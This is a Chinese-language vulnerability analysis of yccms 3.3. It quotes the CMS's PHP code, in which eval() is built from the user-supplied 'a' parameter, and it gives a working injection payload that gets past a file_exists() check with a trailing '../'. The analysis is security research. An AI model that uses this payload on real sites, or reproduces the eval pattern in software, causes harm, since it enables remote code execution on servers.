## yccms3.3 任意代码执行漏洞分析

------

### 前言

​	搜索这个cms的时候无意发现还有人发了这个cms的命令执行漏洞的文章，于是继续分析一波

### 分析过程

​	还是直接的全局搜索了一下敏感函数，找了一下eval，定位到了这几个文件

Action.class.php	Factory.class.php	run.inc.php（入口文件）

​	首先分析的是Action.class.php

```php
class Action {
	protected $_tpl = null;
	protected $_model = null;	
	protected function __construct() {
		$this->_tpl = TPL::getInstance();
		$this->_model = Factory::setModel();
		Tool::setRequest(); //表单转义和html过滤	
	}
...
	public function run() {
		$_m = isset($_GET['m']) ? $_GET['m'] : 'index';
		//var_dump($_m);
		//$vuln = '$this->'.$_m.'();';
		//var_dump($vuln);
		//exit();
		method_exists($this, $_m) ? eval('$this->'.$_m.'();') : $this->index();
	}
}
```

​	这里的m是我们人为可以控制的，也没什么过滤，但下面有个 method_exists() ，找了一下，没找到什么绕过方法，这个点估计也利用不起来了，所以把目标转到了另一处eval。

Faction.class.php

```php
class Factory{
	static private $_obj=null;
	static public function setAction(){
		$_a=self::getA();//白名单进行限制
		if (in_array($_a, array('admin', 'nav', 'article','backup','html','link','pic','search','system','xml','online'))) {
			if (!isset($_SESSION['admin'])) {
				header('Location:'.'?a=login');
			}
		}
		//var_dump(ROOT_PATH.'/controller/'.$_a.'Action.class.php');
		//echo '<br>';
		//var_dump('self::$_obj = new '.ucfirst($_a).'Action();');
		
		//file_exists检测文件是否存在
		if (!file_exists(ROOT_PATH.'/controller/'.$_a.'Action.class.php')) $_a = 'Index';
		//var_dump($_a);
		//echo 'here';
		//var_dump('self::$_obj = new '.ucfirst($_a).'Action();');
		//exit();
		eval('self::$_obj = new '.ucfirst($_a).'Action();');
		//exit();
		return self::$_obj;
	}
	
	static public function setModel() {
		$_a = self::getA();
		if (file_exists(ROOT_PATH.'/model/'.$_a.'Model.class.php')) eval('self::$_obj = new '.ucfirst($_a).'Model();');
		return self::$_obj;
	}
	static public function getA(){
		if(isset($_GET['a']) && !empty($_GET['a'])){
			return $_GET['a'];
		}
		return 'login';
	}
}
```

run.inc.php

```php
Factory::setAction()->run();
```

​	在run.inc.php中调用了Factory中的setAction函数后再去调用run()函数，run()在上面那个文件里分析过利用不起来了，所以目标转向setAction()，首先获取了传过去的a值，然后进入一个乍一看是白名单实际上不知道是什么东西的判断语句后来到下面的file_exists()这进行判断，而在windows下经过测试，在后面加上个 ../ 就能绕过了（linux下还没测过）。把file_exists() 绕过后其实就没什么了，直接闭合前面的语句然后注入代码就好了

```php
payload:?a=factory();phpinfo();exit();//../
```

​	后来再看的时候，发现其实 Action.class.php 也是可以利用的，在这个类 __construct() 的过程中调用了 Factory 类中的 setModel() 函数，不过似乎想去利用这个点之前都要经过一次 setAction() ，所以就没必要折腾了，直接利用setAction() 就好了。